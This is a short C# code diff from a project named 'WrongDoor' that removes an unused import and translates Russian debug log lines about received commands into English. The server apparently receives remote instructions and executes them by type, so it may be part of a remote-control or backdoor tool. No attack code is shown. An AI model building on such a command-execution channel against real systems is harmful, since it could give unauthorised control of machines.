@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Linq;
 using System.Threading.Tasks;
 using WrongDoor.Connector;
 using WrongDoor.MainServer.CommandExutors;
@@ -39,9 +38,9 @@ namespace WrongDoor.MainServer
                 {
 #if DEBUG
                     Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine($"Новая инструкция от, типа {command.type}, на время : '{command.time}'");
+                    Console.WriteLine($"New instruction from, with type: {command.type}, execution time: '{command.time}'");
                     Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine($"Команда : '{command.body}'");
+                    Console.WriteLine($"Command : '{command.body}'");
 #endif
 
                     var output = await ExecuteCommandBasedOnType(command);
